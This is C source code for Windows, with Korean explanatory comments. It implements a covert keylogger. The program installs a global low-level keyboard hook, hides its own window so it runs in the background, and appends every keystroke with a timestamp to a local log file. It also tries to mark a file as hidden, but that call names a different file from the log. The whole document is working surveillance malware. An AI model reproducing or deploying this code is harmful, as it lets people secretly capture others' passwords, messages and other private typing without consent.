#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h> 
#include <stdio.h> 
#include <fileapi.h>
HHOOK hHook; 
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) { \
	FILE* out;
	
	if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) { 
		PKBDLLHOOKSTRUCT pKey = (PKBDLLHOOKSTRUCT)lParam; 
		
		//Code가 0보다 클 때에만 처리, 작으면 통과 
		//wParam==WM_KEYDOWN(0x100,256)은 키보드를 누를 때 
		//wParam==0x10B(267)는 키보드를 땔 때 코드가 실행 
		
		if (nCode >= 0 && (int)wParam == 256) { 
			//lParam포인터(pKey)가 가리키는 곳에서 vkCode(키보드값)를 읽음 
			SYSTEMTIME st; 
			GetLocalTime(&st); 
			out = fopen("KeyLog.txt", "a");
			fprintf(out,"[%02d_%02d_%02d_%02d:%02d:%02d] : ", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond); 
			
			if ((GetAsyncKeyState(VK_LCONTROL) & 0x8000) || (GetAsyncKeyState(VK_RCONTROL) & 0x8000)) { 
				fprintf(out, "[Ctrl] + "); 
			} 
			else if ((GetAsyncKeyState(VK_LSHIFT) & 0x8000) || (GetAsyncKeyState(VK_RSHIFT) & 0x8000)) {
				fprintf(out, "[Shift] + ");
			} 
			else if (VK_BACK == pKey->vkCode) { 
				fprintf(out, "[Backspace] \n");
			} 
			
			if (VK_LSHIFT == pKey->vkCode || VK_RSHIFT == pKey->vkCode) { 
				fprintf(out, "[Shift] \n");
			}
			else if (VK_LCONTROL == pKey->vkCode || VK_RCONTROL == pKey->vkCode) { 
				fprintf(out, "[Ctrl] \n");
			} 
			else if (VK_RETURN == pKey->vkCode) { 
				fprintf(out, "[Enter] \n");
			} 
			else if (VK_SPACE == pKey->vkCode) { 
				fprintf(out, "[Space] \n");
			} 
			else { 
				fprintf(out, "%c \n", pKey->vkCode);
			} 
			fclose(out);
			SetFileAttributesA("logging.txt", FILE_ATTRIBUTE_HIDDEN);
		}
	} 
	CallNextHookEx(hHook, nCode, wParam, lParam); 
	// 필수는 아니지만 하는 것을 강력히 추천
	// Hooking으로 인해 키보드 입력이 이 프로그램으로 들어오는데 이를 다시 원래의 응용프로그램으로 넘겨주는 것(relay기능)
	return 0; 
} 

void SetHook() { 
	HMODULE hInstance = GetModuleHandle(NULL); // 호출 프로세스(.exe 파일)를 만드는 데 사용된 모듈에 대한 핸들
	hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, NULL); 
	/* 타겟 프로그램의 윈도우 메시지 처리 프로시저를 내가 만든 윈도우 메시지 처리 프로시저로 변경
	 WH_KEYBOARD_LL : 로우 레밸 키보드 입력 이벤트 후킹
	 KeyboardProc : 내가 만든 윈도우 메시지 처리 프로시져
	 NULL : 전역 후킹
	*/	
}

void UnHook() { 
	UnhookWindowsHookEx(hHook); 
} 

int main() { 
	HWND hWnd = GetForegroundWindow(); // 작업중인 window(창)의 핸들을 가지고 옴
	ShowWindow(hWnd, SW_HIDE); // SW_HIDE를 통해 백그라운드 실행
	printf("[Key_Logger] >>> Start\n"); 
	SetHook(); 
	MSG msg;
	GetMessage(&msg, NULL, NULL, NULL); 
	//메세지큐에서 메세지를 읽음 
	//메세지가 WM_QUIT일 경우 프로그램을 종료하라는 의미이므로 False를 반환 
	UnHook(); 

}
